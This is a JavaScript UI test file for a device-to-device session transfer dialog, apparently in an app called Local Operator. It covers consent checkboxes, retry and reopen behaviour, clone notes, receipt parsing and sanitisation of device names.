	assert.equal(view.confirm().disabled, true);
	assert.ok(document.querySelector('[data-notice="changed"]'));
});

test("R4: loading keeps Confirm disabled; a failed read offers Check again and leaves Confirm usable", async () => {
	/*
	 * HELD, THEN RELEASED: a preflight that never settles leaves the desktop
	 * transport's deadline timer alive, and the file then outlives its last
	 * test by that deadline (measured: a run with one failing test sat past a
	 * 50 s kill). Released in `finally` so a failing assertion cannot strand it.
	 */
	let release = () => {};
	installBridge({
		features: WS_FEATURES,
		answer: () =>
			new Promise((resolve) => {
				release = () =>
					resolve({ status: 200, body: { result: { working_set: block() } } });
			}),
	});
	let view = await mount({});
	try {
		assert.match(
			document.querySelector('[role="dialog"] [aria-live="polite"]')
				.textContent,
			/Checking which working files/,
		);
		assert.equal(view.confirm().disabled, true, "no confirming blind");
	} finally {
		release();
		await settle();
	}
	await mounted();
	mounted = null;
	let asked = 0;
	const calls = installBridge({
		features: WS_FEATURES,
		answer: () => {
			asked += 1;
			return asked === 1
				? {
						status: 503,
						body: {
							detail: { code: "peer_unreachable", message: "no answer" },
						},
					}
				: { status: 200, body: { result: { working_set: block() } } };
		},
	});
	view = await mount({});
	assert.match(
		document.querySelector('[role="dialog"]').textContent,
		/Couldn't check/,
	);
	assert.equal(
		view.confirm().disabled,
		false,
		"the route still guards the move",
	);
	const again = [...document.querySelectorAll('[role="dialog"] button')].find(
		(button) => button.textContent === "Check again",
	);
	await act(async () => again.click());
	await settle();
	assert.equal(
		calls.filter((op) => op === "sessions.transfer.preflight").length,
		2,
	);
	assert.ok(reviewRoot(), "the retry renders the review");
	assert.equal(view.confirm().disabled, true, "now it waits for the tick");
});

test("U8/N3: the checkbox is required and the dimmed Confirm says why", async () => {
	installBridge({ features: WS_FEATURES, preflight: { working_set: block() } });
	const view = await mount({});
	const box = document.querySelector(
		'[data-testid="working-set-consent"] [role="checkbox"]',
	);
	assert.equal(box.getAttribute("aria-required"), "true");
	const described = view.confirm().getAttribute("aria-describedby");
	assert.ok(described);
	assert.match(
		document.getElementById(described).textContent,
		/I'm confident build-box should receive these files/,
	);
	await act(async () => box.click());
	assert.equal(view.confirm().getAttribute("aria-describedby"), null);
});

test("D8/D6/U7: zero counts are omitted; files-stay mode says no 'move again' and no double negative", async () => {
	installBridge({
		features: WS_FEATURES,
		preflight: {
			working_set: block({
				worktrees: [
					{
						...block().worktrees[0],
						staged: 0,
						untracked: 0,
						clone: undefined,
					},
					block().worktrees[1],
				],
			}),
		},
	});
	await mount({});
	const text = reviewRoot().textContent;
	assert.match(text, /3 unpushed commits · 2 unstaged/);
	assert.doesNotMatch(text, /0 staged|0 untracked/);
	await mounted();
	mounted = null;
	installBridge({
		features: WS_FEATURES,
		preflight: { working_set: block({ carries_files: false }) },
	});
	await mount({});
	const stay = reviewRoot().textContent;
	assert.match(
		stay,
		/This version of Local Operator doesn't move working files yet/,
	);
	assert.match(stay, /Left out even when working files move/);
	assert.doesNotMatch(stay, /Withheld — not sent/);
	assert.match(stay, /Unpushed history contains secret-shaped material\./);
	assert.doesNotMatch(stay, /then move again/);
});

test("D6a: the pending-clone note names the destination device", async () => {
	installBridge({
		features: WS_FEATURES,
		preflight: {
			working_set: block({
				worktrees: [
					{
						...block().worktrees[0],
						clone: undefined,
						clone_check: "pending_destination",
						remote_url: "git@github.com:o/r.git",
					},
				],
			}),
		},
	});
	await mount({});
	assert.match(
		reviewRoot().textContent,
		/If build-box doesn't have this repository, it's cloned from git@github\.com:o\/r\.git/,
	);
});

test("D5: the consent never names an opaque device id", async () => {
	installBridge({ features: WS_FEATURES, preflight: { working_set: block() } });
	const seed = api.workingSetReopen(
		api.meshRefusal(refusalError("working_set_unknown")),
	);
	await mount({ workingSetSeed: seed });
	const text = reviewRoot().textContent;
	assert.doesNotMatch(text, new RegExp(PEER));
	assert.match(text, /the other device/);
});

test("U2: an unconfirmed reopen says why the dialog came back", async () => {
	installBridge({ features: WS_FEATURES, preflight: { working_set: block() } });
	const seed = api.workingSetReopen(
		api.meshRefusal(
			refusalError("working_set_unconfirmed", { working_set: block() }),
		),
	);
	await mount({ workingSetSeed: seed });
	assert.match(
		document.querySelector('[data-notice="unconfirmed"]').textContent,
		/Review the list, then confirm/,
	);
});

test("U4: a consent reopen keeps the Move/Copy pair, the risk, and the user's pick", async () => {
	const copy = { ...plan, keep: true, verb: "Copy to build-box" };
	const asked = { plan, alternatives: [copy], risky: true };
	const refused = { ...copy, confirmWorkingSet: DIGEST };
	assert.deepEqual(api.reopenAsk(asked, refused, false), {
		plan,
		alternatives: [copy],
		risky: true,
		initialKeep: true,
	});
	// A different move falls back to the refused plan and the caller's risk.
	assert.deepEqual(api.reopenAsk(asked, { ...refused, to: "local" }, true), {
		plan: { ...refused, to: "local" },
		alternatives: [],
		risky: true,
	});
	installBridge({ features: WS_FEATURES, preflight: { working_set: block() } });
	const seed = api.workingSetReopen(
		api.meshRefusal(
			refusalError("working_set_changed", { working_set: block() }),
		),
	);
	await mount({
		...api.reopenAsk(asked, refused, false),
		workingSetSeed: seed,
	});
	const radios = [
		...document.querySelectorAll('[role="dialog"] input[type="radio"]'),
	];
	assert.equal(radios.length, 2, "the Move/Copy choice is still offered");
	assert.equal(
		radios
			.find((radio) => radio.checked)
			.closest("label")
			.textContent.includes("Copy to build-box"),
		true,
	);
	assert.match(
		document.querySelector('[role="dialog"]').textContent,
		/open on the other end|open elsewhere/,
	);
});

test("R4: the chat header reopens the dialog seeded when the store records a consent refusal", async () => {
	const calls = installBridge({
		features: WS_FEATURES,
		preflight: { working_set: block() },
	});
	const host = document.createElement("div");
	document.body.append(host);
	const root = createRoot(host);
	const client = new QueryClient({
		defaultOptions: { queries: { retry: false } },
	});
	const model = api.devicePickerModel({
		placement: { kind: "local" },
		selfDeviceId: "",
		selfName: "damian-mbp",
		selfConversations: 1,
		networks: [],
		peers: [],
		canTransfer: true,
		meshRead: "ok",
		busy: false,
	});
	await act(async () =>
		root.render(
			h(
				QueryClientProvider,
				{ client },
				h(api.ChatHeaderDevice, {
					placement: { kind: "local" },
					model,
					sessionId: plan.sessionId,
					busy: false,
					onPick: () => {},
					onCheckAgain: () => {},
				}),
			),
		),
	);
	mounted = async () => {
		await act(async () => root.unmount());
		host.remove();
		client.clear();
		document.body.innerHTML = "";
	};
	assert.equal(document.querySelector('[role="dialog"]'), null);
	const refusal = api.meshRefusal(
		refusalError("working_set_changed", {
			working_set: block({ scope_digest: FRESH_DIGEST }),
		}),
	);
	await act(async () =>
		api.useChatDeviceStore.getState().refuseMove(plan.sessionId, {
			refusal,
			name: "build-box",
			canWait: false,
			plan: { ...plan, confirmWorkingSet: DIGEST },
			to: PEER,
			from: null,
			keep: false,
		}),
	);
	await settle();
	assert.ok(reviewRoot(), "the dialog reopened with the review");
	assert.ok(document.querySelector('[data-notice="changed"]'));
	assert.equal(
		calls.includes("sessions.transfer.preflight"),
		false,
		"seeded from the refusal, no new read",
	);
	assert.equal(
		api.useChatDeviceStore.getState().moves[plan.sessionId],
		undefined,
		"the pane notice is dismissed in favour of the dialog",
	);
});

test("the transfer receipt reads the core's engagement block, and only a real one", () => {
	const base = { session_id: plan.sessionId, mode: "move", locality: "remote" };
	assert.deepEqual(
		api.transferReceipt({
			...base,
			engagement: { engaged: true, reason: "active", detail: "" },
		}).engagement,
		{ engaged: true, reason: "active" },
	);
	assert.equal(api.transferReceipt(base).engagement, null);
	assert.equal(
		api.transferReceipt({ ...base, engagement: { engaged: "yes" } }).engagement,
		null,
	);
});

test("the core's whole DETAIL_CODES list has its own sentence, and run_on names the lender when it can", () => {
	// core #4241 @ ca98f378922f `network/workset_probe.py` DETAIL_CODES, in order.
	for (const code of [
		"auth_denied",
		"not_found",
		"unreachable",
		"tls",
		"host_key",
		"timeout",
		"host_refused",
		"url_refused",
		"git_missing",
		"probe_error",
		"error",
	]) {
		const sentence = api.probeDetailSentence(code, "build-box");
		assert.doesNotMatch(sentence, /Reason reported by/, `${code} is mapped`);
	}
	assert.equal(api.remedyDevice("lending_device"), null);
	assert.equal(api.remedyDevice(""), null);
	assert.equal(api.remedyDevice("damian-mac"), "damian-mac");
	assert.equal(
		api.remedyDevice("Damian's MacBook Pro"),
		"Damian's MacBook Pro",
	);
	assert.equal(api.remedyDevice("x\u202Ey"), null);
	assert.equal(api.remedyDevice("<b>x</b>"), null);
});
